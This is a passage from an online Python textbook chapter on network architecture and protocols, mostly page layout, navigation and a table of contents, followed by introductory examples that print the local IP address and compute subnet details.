<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en"><head>

<meta charset="utf-8">
<meta name="generator" content="quarto-1.5.45">

<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">


<title>16&nbsp; Network Architecture and Protocols with Python â€“ Python for Business Analytics and Informaton Systems</title>
<style>
code{white-space: pre-wrap;}
span.smallcaps{font-variant: small-caps;}
div.columns{display: flex; gap: min(4vw, 1.5em);}
div.column{flex: auto; overflow-x: auto;}
div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
ul.task-list{list-style: none;}
ul.task-list li input[type="checkbox"] {
  width: 0.8em;
  margin: 0 0.8em 0.2em -1em; /* quarto-specific, see https://github.com/quarto-dev/quarto-cli/issues/4556 */ 
  vertical-align: middle;
}
/* CSS for syntax highlighting */
pre > code.sourceCode { white-space: pre; position: relative; }
pre > code.sourceCode > span { line-height: 1.25; }
pre > code.sourceCode > span:empty { height: 1.2em; }
.sourceCode { overflow: visible; }
code.sourceCode > span { color: inherit; text-decoration: inherit; }
div.sourceCode { margin: 1em 0; }
pre.sourceCode { margin: 0; }
@media screen {
div.sourceCode { overflow: auto; }
}
@media print {
pre > code.sourceCode { white-space: pre-wrap; }
pre > code.sourceCode > span { display: inline-block; text-indent: -5em; padding-left: 5em; }
}
pre.numberSource code
  { counter-reset: source-line 0; }
pre.numberSource code > span
  { position: relative; left: -4em; counter-increment: source-line; }
pre.numberSource code > span > a:first-child::before
  { content: counter(source-line);
    position: relative; left: -1em; text-align: right; vertical-align: baseline;
    border: none; display: inline-block;
    -webkit-touch-callout: none; -webkit-user-select: none;
    -khtml-user-select: none; -moz-user-select: none;
    -ms-user-select: none; user-select: none;
    padding: 0 4px; width: 4em;
  }
pre.numberSource { margin-left: 3em;  padding-left: 4px; }
div.sourceCode
  {   }
@media screen {
pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
}
</style>


<script src="site_libs/quarto-nav/quarto-nav.js"></script>
<script src="site_libs/quarto-nav/headroom.min.js"></script>
<script src="site_libs/clipboard/clipboard.min.js"></script>
<script src="site_libs/quarto-search/autocomplete.umd.js"></script>
<script src="site_libs/quarto-search/fuse.min.js"></script>
<script src="site_libs/quarto-search/quarto-search.js"></script>
<meta name="quarto:offset" content="./">
<link href="./16_network_services_mgmt.html" rel="next">
<link href="./14_foundations_of_data_comm.html" rel="prev">
<script src="site_libs/quarto-html/quarto.js"></script>
<script src="site_libs/quarto-html/popper.min.js"></script>
<script src="site_libs/quarto-html/tippy.umd.min.js"></script>
<script src="site_libs/quarto-html/anchor.min.js"></script>
<link href="site_libs/quarto-html/tippy.css" rel="stylesheet">
<link href="site_libs/quarto-html/quarto-syntax-highlighting.css" rel="stylesheet" id="quarto-text-highlighting-styles">
<script src="site_libs/bootstrap/bootstrap.min.js"></script>
<link href="site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
<link href="site_libs/bootstrap/bootstrap.min.css" rel="stylesheet" id="quarto-bootstrap" data-mode="light">
<script id="quarto-search-options" type="application/json">{
  "location": "sidebar",
  "copy-button": false,
  "collapse-after": 3,
  "panel-placement": "start",
  "type": "textbox",
  "limit": 50,
  "keyboard-shortcut": [
    "f",
    "/",
    "s"
  ],
  "show-item-context": false,
  "language": {
    "search-no-results-text": "No results",
    "search-matching-documents-text": "matching documents",
    "search-copy-link-title": "Copy link to search",
    "search-hide-matches-text": "Hide additional matches",
    "search-more-match-text": "more match in this document",
    "search-more-matches-text": "more matches in this document",
    "search-clear-button-title": "Clear",
    "search-text-placeholder": "",
    "search-detached-cancel-button-title": "Cancel",
    "search-submit-button-title": "Submit",
    "search-label": "Search"
  }
}</script>


</head>

<body class="nav-sidebar floating">

<div id="quarto-search-results"></div>
  <header id="quarto-header" class="headroom fixed-top">
  <nav class="quarto-secondary-nav">
    <div class="container-fluid d-flex">
      <button type="button" class="quarto-btn-toggle btn" data-bs-toggle="collapse" role="button" data-bs-target=".quarto-sidebar-collapse-item" aria-controls="quarto-sidebar" aria-expanded="false" aria-label="Toggle sidebar navigation" onclick="if (window.quartoToggleHeadroom) { window.quartoToggleHeadroom(); }">
        <i class="bi bi-layout-text-sidebar-reverse"></i>
      </button>
        <nav class="quarto-page-breadcrumbs" aria-label="breadcrumb"><ol class="breadcrumb"><li class="breadcrumb-item"><a href="./15_network_architecture_protocols.html"><span class="chapter-number">16</span>&nbsp; <span class="chapter-title">Network Architecture and Protocols with Python</span></a></li></ol></nav>
        <a class="flex-grow-1" role="navigation" data-bs-toggle="collapse" data-bs-target=".quarto-sidebar-collapse-item" aria-controls="quarto-sidebar" aria-expanded="false" aria-label="Toggle sidebar navigation" onclick="if (window.quartoToggleHeadroom) { window.quartoToggleHeadroom(); }">      
        </a>
      <button type="button" class="btn quarto-search-button" aria-label="Search" onclick="window.quartoOpenSearch();">
        <i class="bi bi-search"></i>
      </button>
    </div>
  </nav>
</header>
<!-- content -->
<div id="quarto-content" class="quarto-container page-columns page-rows-contents page-layout-article">
<!-- sidebar -->
  <nav id="quarto-sidebar" class="sidebar collapse collapse-horizontal quarto-sidebar-collapse-item sidebar-navigation floating overflow-auto">
    <div class="pt-lg-2 mt-2 text-left sidebar-header">
    <div class="sidebar-title mb-0 py-0">
      <a href="./">Python for Business Analytics and Informaton Systems</a> 
    </div>
      </div>
        <div class="mt-2 flex-shrink-0 align-items-center">
        <div class="sidebar-search">
        <div id="quarto-search" class="" title="Search"></div>
        </div>
        </div>
    <div class="sidebar-menu-container"> 
    <ul class="list-unstyled mt-1">
        <li class="sidebar-item">
  <div class="sidebar-item-container"> 
  <a href="./index.html" class="sidebar-item-text sidebar-link">
 <span class="menu-text">Preface</span></a>
  </div>
</li>
        <li class="sidebar-item">
  <div class="sidebar-item-container"> 
  <a href="./intro.html" class="sidebar-item-text sidebar-link">
 <span class="menu-text"><span class="chapter-number">1</span>&nbsp; <span class="chapter-title">Introduction</span></span></a>
  </div>
</li>
        <li class="sidebar-item">
  <div class="sidebar-item-container"> 
  <a href="./01_python_install_env_setup.html" class="sidebar-item-text sidebar-link">
 <span class="menu-text"><span class="chapter-number">2</span>&nbsp; <span class="chapter-title">Installing Python</span></span></a>
  </div>
</li>
        <li class="sidebar-item">
  <div class="sidebar-item-container"> 
  <a href="./02_python_basics.html" class="sidebar-item-text sidebar-link">
 <span class="menu-text"><span class="chapter-number">3</span>&nbsp; <span class="chapter-title">Introduction to Python Programming Basics for Business</span></span></a>
  </div>
</li>
        <li class="sidebar-item">
  <div class="sidebar-item-container"> 
  <a href="./03_python_control_structures.html" class="sidebar-item-text sidebar-link">
 <span class="menu-text"><span class="chapter-number">4</span>&nbsp; <span class="chapter-title">Python Control Structures for Business Applications</span></span></a>
  </div>
</li>
        <li class="sidebar-item">
  <div class="sidebar-item-container"> 
  <a href="./04_python_functions_modules.html" class="sidebar-item-text sidebar-link">
 <span class="menu-text"><span class="chapter-number">5</span>&nbsp; <span class="chapter-title">Introduction to Python Functions</span></span></a>
  </div>
</li>
        <li class="sidebar-item">
  <div class="sidebar-item-container"> 
  <a href="./05_python_data_handling_file_io.html" class="sidebar-item-text sidebar-link">
 <span class="menu-text"><span class="chapter-number">6</span>&nbsp; <span class="chapter-title">Introduction to Data Handling and File I/O in Python</span></span></a>
  </div>
</li>
        <li class="sidebar-item">
  <div class="sidebar-item-container"> 
  <a href="./06_python_error_handling_debugging.html" class="sidebar-item-text sidebar-link">
 <span class="menu-text"><span class="chapter-number">7</span>&nbsp; <span class="chapter-title">Introduction to Error Handling and Debugging in Python</span></span></a>
  </div>
</li>
        <li class="sidebar-item">
  <div class="sidebar-item-container"> 
  <a href="./07_python_oop.html" class="sidebar-item-text sidebar-link">
 <span class="menu-text"><span class="chapter-number">8</span>&nbsp; <span class="chapter-title">Introduction to Object-Oriented Programming with Python</span></span></a>
  </div>
</li>
        <li class="sidebar-item">
  <div class="sidebar-item-container"> 
  <a href="./08_python_database_interaction.html" class="sidebar-item-text sidebar-link">
 <span class="menu-text"><span class="chapter-number">9</span>&nbsp; <span class="chapter-title">Introduction to Database Interaction with Python</span></span></a>
  </div>
</li>
        <li class="sidebar-item">
  <div class="sidebar-item-container"> 
  <a href="./09_python_api_interaction.html" class="sidebar-item-text sidebar-link">
 <span class="menu-text"><span class="chapter-number">10</span>&nbsp; <span class="chapter-title">Introduction to API Interactions with Python</span></span></a>
  </div>
</li>
        <li class="sidebar-item">
  <div class="sidebar-item-container"> 
  <a href="./10_python_automated_sys_tasks.html" class="sidebar-item-text sidebar-link">
 <span class="menu-text"><span class="chapter-number">11</span>&nbsp; <span class="chapter-title">Introduction to Automating System Tasks with Python</span></span></a>
  </div>
</li>
        <li class="sidebar-item">
  <div class="sidebar-item-container"> 
  <a href="./11_python_testing.html" class="sidebar-item-text sidebar-link">
 <span class="menu-text"><span class="chapter-number">12</span>&nbsp; <span class="chapter-title">Introduction to Testing in Python</span></span></a>
  </div>
</li>
        <li class="sidebar-item">
  <div class="sidebar-item-container"> 
  <a href="./12_python_adv_concepts.html" class="sidebar-item-text sidebar-link">
 <span class="menu-text"><span class="chapter-number">13</span>&nbsp; <span class="chapter-title">Advanced Python Concepts</span></span></a>
  </div>
</li>
        <li class="sidebar-item">
  <div class="sidebar-item-container"> 
  <a href="./13_python_lib_for_sys_design.html" class="sidebar-item-text sidebar-link">
 <span class="menu-text"><span class="chapter-number">14</span>&nbsp; <span class="chapter-title">Introduction to Python Libraries for System Design</span></span></a>
  </div>
</li>
        <li class="sidebar-item">
  <div class="sidebar-item-container"> 
  <a href="./14_foundations_of_data_comm.html" class="sidebar-item-text sidebar-link">
 <span class="menu-text"><span class="chapter-number">15</span>&nbsp; <span class="chapter-title">Foundations of Data Communication with Python</span></span></a>
  </div>
</li>
        <li class="sidebar-item">
  <div class="sidebar-item-container"> 
  <a href="./15_network_architecture_protocols.html" class="sidebar-item-text sidebar-link active">
 <span class="menu-text"><span class="chapter-number">16</span>&nbsp; <span class="chapter-title">Network Architecture and Protocols with Python</span></span></a>
  </div>
</li>
        <li class="sidebar-item">
  <div class="sidebar-item-container"> 
  <a href="./16_network_services_mgmt.html" class="sidebar-item-text sidebar-link">
 <span class="menu-text"><span class="chapter-number">17</span>&nbsp; <span class="chapter-title">Network Services and Management with Python</span></span></a>
  </div>
</li>
        <li class="sidebar-item">
  <div class="sidebar-item-container"> 
  <a href="./17_adv_network_concepts.html" class="sidebar-item-text sidebar-link">
 <span class="menu-text"><span class="chapter-number">18</span>&nbsp; <span class="chapter-title">Advanced Networking Concepts with Python</span></span></a>
  </div>
</li>
        <li class="sidebar-item">
  <div class="sidebar-item-container"> 
  <a href="./18_modern_network_practices.html" class="sidebar-item-text sidebar-link">
 <span class="menu-text"><span class="chapter-number">19</span>&nbsp; <span class="chapter-title">Modern Network Practices with Python</span></span></a>
  </div>
</li>
        <li class="sidebar-item">
  <div class="sidebar-item-container"> 
  <a href="./summary.html" class="sidebar-item-text sidebar-link">
 <span class="menu-text"><span class="chapter-number">20</span>&nbsp; <span class="chapter-title">Summary</span></span></a>
  </div>
</li>
        <li class="sidebar-item">
  <div class="sidebar-item-container"> 
  <a href="./A1_version_control.html" class="sidebar-item-text sidebar-link">
 <span class="menu-text"><span class="chapter-number">21</span>&nbsp; <span class="chapter-title">Introduction to Version Control</span></span></a>
  </div>
</li>
        <li class="sidebar-item">
  <div class="sidebar-item-container"> 
  <a href="./A2_docker.html" class="sidebar-item-text sidebar-link">
 <span class="menu-text"><span class="chapter-number">22</span>&nbsp; <span class="chapter-title">Using Docker</span></span></a>
  </div>
</li>
        <li class="sidebar-item">
  <div class="sidebar-item-container"> 
  <a href="./references.html" class="sidebar-item-text sidebar-link">
 <span class="menu-text">References</span></a>
  </div>
</li>
    </ul>
    </div>
</nav>
<div id="quarto-sidebar-glass" class="quarto-sidebar-collapse-item" data-bs-toggle="collapse" data-bs-target=".quarto-sidebar-collapse-item"></div>
<!-- margin-sidebar -->
    <div id="quarto-margin-sidebar" class="sidebar margin-sidebar">
        <nav id="TOC" role="doc-toc" class="toc-active">
    <h2 id="toc-title">Table of contents</h2>
   
  <ul>
  <li><a href="#network-layer-topics" id="toc-network-layer-topics" class="nav-link active" data-scroll-target="#network-layer-topics"><span class="header-section-number">16.0.1</span> Network Layer Topics</a></li>
  <li><a href="#transport-layer-topics" id="toc-transport-layer-topics" class="nav-link" data-scroll-target="#transport-layer-topics"><span class="header-section-number">16.0.2</span> Transport Layer Topics</a></li>
  <li><a href="#application-layer-protocols" id="toc-application-layer-protocols" class="nav-link" data-scroll-target="#application-layer-protocols"><span class="header-section-number">16.0.3</span> Application Layer Protocols</a></li>
  <li><a href="#network-packet-analysis-with-scapy" id="toc-network-packet-analysis-with-scapy" class="nav-link" data-scroll-target="#network-packet-analysis-with-scapy"><span class="header-section-number">16.0.4</span> Network Packet Analysis with <code>scapy</code></a></li>
  <li><a href="#conclusion" id="toc-conclusion" class="nav-link" data-scroll-target="#conclusion"><span class="header-section-number">16.0.5</span> Conclusion</a></li>
  <li><a href="#deep-dive-into-the-scapy-python-module-for-network-packet-analysis" id="toc-deep-dive-into-the-scapy-python-module-for-network-packet-analysis" class="nav-link" data-scroll-target="#deep-dive-into-the-scapy-python-module-for-network-packet-analysis"><span class="header-section-number">17</span> Deep Dive into the <code>scapy</code> Python Module for Network Packet Analysis</a>
  <ul class="collapse">
  <li><a href="#table-of-contents" id="toc-table-of-contents" class="nav-link" data-scroll-target="#table-of-contents"><span class="header-section-number">17.1</span> Table of Contents</a></li>
  <li><a href="#introduction-to-scapy" id="toc-introduction-to-scapy" class="nav-link" data-scroll-target="#introduction-to-scapy"><span class="header-section-number">17.2</span> Introduction to <code>scapy</code></a></li>
  <li><a href="#installing-scapy-1" id="toc-installing-scapy-1" class="nav-link" data-scroll-target="#installing-scapy-1"><span class="header-section-number">17.3</span> Installing <code>scapy</code></a></li>
  <li><a href="#basic-concepts" id="toc-basic-concepts" class="nav-link" data-scroll-target="#basic-concepts"><span class="header-section-number">17.4</span> Basic Concepts</a>
  <ul class="collapse">
  <li><a href="#importing-scapy" id="toc-importing-scapy" class="nav-link" data-scroll-target="#importing-scapy"><span class="header-section-number">17.4.1</span> Importing <code>scapy</code></a></li>
  <li><a href="#layers-and-packets" id="toc-layers-and-packets" class="nav-link" data-scroll-target="#layers-and-packets"><span class="header-section-number">17.4.2</span> Layers and Packets</a></li>
  <li><a href="#example" id="toc-example" class="nav-link" data-scroll-target="#example"><span class="header-section-number">17.4.3</span> Example</a></li>
  </ul></li>
  <li><a href="#creating-and-sending-packets" id="toc-creating-and-sending-packets" class="nav-link" data-scroll-target="#creating-and-sending-packets"><span class="header-section-number">17.5</span> Creating and Sending Packets</a>
  <ul class="collapse">
  <li><a href="#creating-packets" id="toc-creating-packets" class="nav-link" data-scroll-target="#creating-packets"><span class="header-section-number">17.5.1</span> Creating Packets</a></li>
  <li><a href="#example-1" id="toc-example-1" class="nav-link" data-scroll-target="#example-1"><span class="header-section-number">17.5.2</span> Example</a></li>
  <li><a href="#sending-packets" id="toc-sending-packets" class="nav-link" data-scroll-target="#sending-packets"><span class="header-section-number">17.5.3</span> Sending Packets</a></li>
  <li><a href="#example-2" id="toc-example-2" class="nav-link" data-scroll-target="#example-2"><span class="header-section-number">17.5.4</span> Example</a></li>
  <li><a href="#sending-multiple-packets" id="toc-sending-multiple-packets" class="nav-link" data-scroll-target="#sending-multiple-packets"><span class="header-section-number">17.5.5</span> Sending Multiple Packets</a></li>
  <li><a href="#example-3" id="toc-example-3" class="nav-link" data-scroll-target="#example-3"><span class="header-section-number">17.5.6</span> Example</a></li>
  </ul></li>
  <li><a href="#capturing-packets" id="toc-capturing-packets" class="nav-link" data-scroll-target="#capturing-packets"><span class="header-section-number">17.6</span> Capturing Packets</a>
  <ul class="collapse">
  <li><a href="#sniffing-packets" id="toc-sniffing-packets" class="nav-link" data-scroll-target="#sniffing-packets"><span class="header-section-number">17.6.1</span> Sniffing Packets</a></li>
  <li><a href="#example-4" id="toc-example-4" class="nav-link" data-scroll-target="#example-4"><span class="header-section-number">17.6.2</span> Example</a></li>
  <li><a href="#filtering-packets" id="toc-filtering-packets" class="nav-link" data-scroll-target="#filtering-packets"><span class="header-section-number">17.6.3</span> Filtering Packets</a></li>
  <li><a href="#example-5" id="toc-example-5" class="nav-link" data-scroll-target="#example-5"><span class="header-section-number">17.6.4</span> Example</a></li>
  </ul></li>
  <li><a href="#analyzing-packets" id="toc-analyzing-packets" class="nav-link" data-scroll-target="#analyzing-packets"><span class="header-section-number">17.7</span> Analyzing Packets</a>
  <ul class="collapse">
  <li><a href="#dissecting-packets" id="toc-dissecting-packets" class="nav-link" data-scroll-target="#dissecting-packets"><span class="header-section-number">17.7.1</span> Dissecting Packets</a></li>
  <li><a href="#example-6" id="toc-example-6" class="nav-link" data-scroll-target="#example-6"><span class="header-section-number">17.7.2</span> Example</a></li>
  <li><a href="#accessing-packet-fields" id="toc-accessing-packet-fields" class="nav-link" data-scroll-target="#accessing-packet-fields"><span class="header-section-number">17.7.3</span> Accessing Packet Fields</a></li>
  <li><a href="#example-7" id="toc-example-7" class="nav-link" data-scroll-target="#example-7"><span class="header-section-number">17.7.4</span> Example</a></li>
  <li><a href="#working-with-layers" id="toc-working-with-layers" class="nav-link" data-scroll-target="#working-with-layers"><span class="header-section-number">17.7.5</span> Working with Layers</a></li>
  <li><a href="#example-8" id="toc-example-8" class="nav-link" data-scroll-target="#example-8"><span class="header-section-number">17.7.6</span> Example</a></li>
  </ul></li>
  <li><a href="#advanced-usage" id="toc-advanced-usage" class="nav-link" data-scroll-target="#advanced-usage"><span class="header-section-number">17.8</span> Advanced Usage</a>
  <ul class="collapse">
  <li><a href="#custom-packet-crafting" id="toc-custom-packet-crafting" class="nav-link" data-scroll-target="#custom-packet-crafting"><span class="header-section-number">17.8.1</span> Custom Packet Crafting</a></li>
  <li><a href="#example-9" id="toc-example-9" class="nav-link" data-scroll-target="#example-9"><span class="header-section-number">17.8.2</span> Example</a></li>
  <li><a href="#packet-manipulation" id="toc-packet-manipulation" class="nav-link" data-scroll-target="#packet-manipulation"><span class="header-section-number">17.8.3</span> Packet Manipulation</a></li>
  <li><a href="#example-10" id="toc-example-10" class="nav-link" data-scroll-target="#example-10"><span class="header-section-number">17.8.4</span> Example</a></li>
  <li><a href="#protocol-dissection" id="toc-protocol-dissection" class="nav-link" data-scroll-target="#protocol-dissection"><span class="header-section-number">17.8.5</span> Protocol Dissection</a></li>
  <li><a href="#example-11" id="toc-example-11" class="nav-link" data-scroll-target="#example-11"><span class="header-section-number">17.8.6</span> Example</a></li>
  </ul></li>
  <li><a href="#practical-examples" id="toc-practical-examples" class="nav-link" data-scroll-target="#practical-examples"><span class="header-section-number">17.9</span> Practical Examples</a>
  <ul class="collapse">
  <li><a href="#example-1-ping-sweep" id="toc-example-1-ping-sweep" class="nav-link" data-scroll-target="#example-1-ping-sweep"><span class="header-section-number">17.9.1</span> Example 1: Ping Sweep</a></li>
  <li><a href="#example-2-arp-spoofing" id="toc-example-2-arp-spoofing" class="nav-link" data-scroll-target="#example-2-arp-spoofing"><span class="header-section-number">17.9.2</span> Example 2: ARP Spoofing</a></li>
  <li><a href="#example-3-dns-spoofing" id="toc-example-3-dns-spoofing" class="nav-link" data-scroll-target="#example-3-dns-spoofing"><span class="header-section-number">17.9.3</span> Example 3: DNS Spoofing</a></li>
  </ul></li>
  <li><a href="#best-practices" id="toc-best-practices" class="nav-link" data-scroll-target="#best-practices"><span class="header-section-number">17.10</span> Best Practices</a></li>
  <li><a href="#conclusion-1" id="toc-conclusion-1" class="nav-link" data-scroll-target="#conclusion-1"><span class="header-section-number">17.11</span> Conclusion</a></li>
  </ul></li>
  <li><a href="#deep-dive-tutorial-on-pythons-socket-module-for-implementing-tcp-and-udp-clients-and-servers" id="toc-deep-dive-tutorial-on-pythons-socket-module-for-implementing-tcp-and-udp-clients-and-servers" class="nav-link" data-scroll-target="#deep-dive-tutorial-on-pythons-socket-module-for-implementing-tcp-and-udp-clients-and-servers"><span class="header-section-number">18</span> Deep Dive Tutorial on Pythonâ€™s <code>socket</code> Module for Implementing TCP and UDP Clients and Servers</a>
  <ul class="collapse">
  <li><a href="#table-of-contents-1" id="toc-table-of-contents-1" class="nav-link" data-scroll-target="#table-of-contents-1"><span class="header-section-number">18.1</span> Table of Contents</a></li>
  <li><a href="#introduction-to-the-socket-module" id="toc-introduction-to-the-socket-module" class="nav-link" data-scroll-target="#introduction-to-the-socket-module"><span class="header-section-number">18.2</span> Introduction to the <code>socket</code> Module</a>
  <ul class="collapse">
  <li><a href="#importing-the-module" id="toc-importing-the-module" class="nav-link" data-scroll-target="#importing-the-module"><span class="header-section-number">18.2.1</span> Importing the Module</a></li>
  </ul></li>
  <li><a href="#socket-basics" id="toc-socket-basics" class="nav-link" data-scroll-target="#socket-basics"><span class="header-section-number">18.3</span> Socket Basics</a>
  <ul class="collapse">
  <li><a href="#creating-a-socket" id="toc-creating-a-socket" class="nav-link" data-scroll-target="#creating-a-socket"><span class="header-section-number">18.3.1</span> Creating a Socket</a></li>
  <li><a href="#example-12" id="toc-example-12" class="nav-link" data-scroll-target="#example-12"><span class="header-section-number">18.3.2</span> Example</a></li>
  <li><a href="#binding-a-socket" id="toc-binding-a-socket" class="nav-link" data-scroll-target="#binding-a-socket"><span class="header-section-number">18.3.3</span> Binding a Socket</a></li>
  <li><a href="#example-13" id="toc-example-13" class="nav-link" data-scroll-target="#example-13"><span class="header-section-number">18.3.4</span> Example</a></li>
  <li><a href="#listening-for-connections-tcp" id="toc-listening-for-connections-tcp" class="nav-link" data-scroll-target="#listening-for-connections-tcp"><span class="header-section-number">18.3.5</span> Listening for Connections (TCP)</a></li>
  <li><a href="#example-14" id="toc-example-14" class="nav-link" data-scroll-target="#example-14"><span class="header-section-number">18.3.6</span> Example</a></li>
  <li><a href="#accepting-connections-tcp" id="toc-accepting-connections-tcp" class="nav-link" data-scroll-target="#accepting-connections-tcp"><span class="header-section-number">18.3.7</span> Accepting Connections (TCP)</a></li>
  <li><a href="#example-15" id="toc-example-15" class="nav-link" data-scroll-target="#example-15"><span class="header-section-number">18.3.8</span> Example</a></li>
  <li><a href="#sending-and-receiving-data" id="toc-sending-and-receiving-data" class="nav-link" data-scroll-target="#sending-and-receiving-data"><span class="header-section-number">18.3.9</span> Sending and Receiving Data</a></li>
  </ul></li>
  <li><a href="#implementing-a-tcp-server" id="toc-implementing-a-tcp-server" class="nav-link" data-scroll-target="#implementing-a-tcp-server"><span class="header-section-number">18.4</span> Implementing a TCP Server</a>
  <ul class="collapse">
  <li><a href="#steps-to-implement-a-tcp-server" id="toc-steps-to-implement-a-tcp-server" class="nav-link" data-scroll-target="#steps-to-implement-a-tcp-server"><span class="header-section-number">18.4.1</span> Steps to Implement a TCP Server</a></li>
  <li><a href="#example-tcp-server" id="toc-example-tcp-server" class="nav-link" data-scroll-target="#example-tcp-server"><span class="header-section-number">18.4.2</span> Example TCP Server</a></li>
  </ul></li>
  <li><a href="#implementing-a-tcp-client" id="toc-implementing-a-tcp-client" class="nav-link" data-scroll-target="#implementing-a-tcp-client"><span class="header-section-number">18.5</span> Implementing a TCP Client</a>
  <ul class="collapse">
  <li><a href="#steps-to-implement-a-tcp-client" id="toc-steps-to-implement-a-tcp-client" class="nav-link" data-scroll-target="#steps-to-implement-a-tcp-client"><span class="header-section-number">18.5.1</span> Steps to Implement a TCP Client</a></li>
  <li><a href="#example-tcp-client" id="toc-example-tcp-client" class="nav-link" data-scroll-target="#example-tcp-client"><span class="header-section-number">18.5.2</span> Example TCP Client</a></li>
  </ul></li>
  <li><a href="#implementing-a-udp-server" id="toc-implementing-a-udp-server" class="nav-link" data-scroll-target="#implementing-a-udp-server"><span class="header-section-number">18.6</span> Implementing a UDP Server</a>
  <ul class="collapse">
  <li><a href="#steps-to-implement-a-udp-server" id="toc-steps-to-implement-a-udp-server" class="nav-link" data-scroll-target="#steps-to-implement-a-udp-server"><span class="header-section-number">18.6.1</span> Steps to Implement a UDP Server</a></li>
  <li><a href="#example-udp-server" id="toc-example-udp-server" class="nav-link" data-scroll-target="#example-udp-server"><span class="header-section-number">18.6.2</span> Example UDP Server</a></li>
  </ul></li>
  <li><a href="#implementing-a-udp-client" id="toc-implementing-a-udp-client" class="nav-link" data-scroll-target="#implementing-a-udp-client"><span class="header-section-number">18.7</span> Implementing a UDP Client</a>
  <ul class="collapse">
  <li><a href="#steps-to-implement-a-udp-client" id="toc-steps-to-implement-a-udp-client" class="nav-link" data-scroll-target="#steps-to-implement-a-udp-client"><span class="header-section-number">18.7.1</span> Steps to Implement a UDP Client</a></li>
  <li><a href="#example-udp-client" id="toc-example-udp-client" class="nav-link" data-scroll-target="#example-udp-client"><span class="header-section-number">18.7.2</span> Example UDP Client</a></li>
  </ul></li>
  <li><a href="#error-handling-and-best-practices" id="toc-error-handling-and-best-practices" class="nav-link" data-scroll-target="#error-handling-and-best-practices"><span class="header-section-number">18.8</span> Error Handling and Best Practices</a>
  <ul class="collapse">
  <li><a href="#error-handling" id="toc-error-handling" class="nav-link" data-scroll-target="#error-handling"><span class="header-section-number">18.8.1</span> Error Handling</a></li>
  <li><a href="#example-16" id="toc-example-16" class="nav-link" data-scroll-target="#example-16"><span class="header-section-number">18.8.2</span> Example</a></li>
  <li><a href="#best-practices-1" id="toc-best-practices-1" class="nav-link" data-scroll-target="#best-practices-1"><span class="header-section-number">18.8.3</span> Best Practices</a></li>
  </ul></li>
  <li><a href="#conclusion-2" id="toc-conclusion-2" class="nav-link" data-scroll-target="#conclusion-2"><span class="header-section-number">18.9</span> Conclusion</a></li>
  </ul></li>
  </ul>
</nav>
    </div>
<!-- main -->
<main class="content" id="quarto-document-content">

<header id="title-block-header" class="quarto-title-block default">
<div class="quarto-title">
<h1 class="title"><span class="chapter-number">16</span>&nbsp; <span class="chapter-title">Network Architecture and Protocols with Python</span></h1>
</div>



<div class="quarto-title-meta">

    
  
    
  </div>
  


</header>


<p>Understanding network architecture and protocols is crucial for designing and managing efficient networks. This tutorial will cover key concepts in network architecture, including IP addressing, subnetting, and routing algorithms. It will also delve into transport layer topics like TCP/UDP protocols, flow control, and error control, and explore application layer protocols such as HTTP, FTP, and SMTP. Weâ€™ll use Python libraries like <code>scapy</code> for network packet analysis and <code>socket</code> for implementing TCP and UDP clients and servers.</p>
<section id="network-layer-topics" class="level3" data-number="16.0.1">
<h3 data-number="16.0.1" class="anchored" data-anchor-id="network-layer-topics"><span class="header-section-number">16.0.1</span> Network Layer Topics</h3>
<section id="ip-addressing" class="level4" data-number="16.0.1.1">
<h4 data-number="16.0.1.1" class="anchored" data-anchor-id="ip-addressing"><span class="header-section-number">16.0.1.1</span> IP Addressing</h4>
<p>IP addressing is the method by which devices on a network are identified. IPv4 addresses are 32-bit numbers usually represented in dot-decimal notation (e.g., 192.168.1.1).</p>
<section id="example-displaying-local-ip-address" class="level5" data-number="16.0.1.1.1">
<h5 data-number="16.0.1.1.1" class="anchored" data-anchor-id="example-displaying-local-ip-address"><span class="header-section-number">16.0.1.1.1</span> Example: Displaying Local IP Address</h5>
<div class="sourceCode" id="cb1"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> socket</span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>hostname <span class="op">=</span> socket.gethostname()</span>
<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>local_ip <span class="op">=</span> socket.gethostbyname(hostname)</span>
<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="ss">f"Local IP Address: </span><span class="sc">{</span>local_ip<span class="sc">}</span><span class="ss">"</span>)</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
</section>
<section id="subnetting" class="level4" data-number="16.0.1.2">
<h4 data-number="16.0.1.2" class="anchored" data-anchor-id="subnetting"><span class="header-section-number">16.0.1.2</span> Subnetting</h4>
<p>Subnetting divides a network into smaller sub-networks (subnets) to improve management and security. Subnets are defined by their subnet mask.</p>
<section id="example-calculating-subnet-information" class="level5" data-number="16.0.1.2.1">
<h5 data-number="16.0.1.2.1" class="anchored" data-anchor-id="example-calculating-subnet-information"><span class="header-section-number">16.0.1.2.1</span> Example: Calculating Subnet Information</h5>
<div class="sourceCode" id="cb2"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> ipaddress</span>
<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>network <span class="op">=</span> ipaddress.ip_network(<span class="st">'192.168.1.0/24'</span>)</span>
<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="ss">f"Network: </span><span class="sc">{</span>network<span class="sc">}</span><span class="ss">"</span>)</span>
<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="ss">f"Netmask: </span><span class="sc">{</span>network<span class="sc">.</span>netmask<span class="sc">}</span><span class="ss">"</span>)</span>
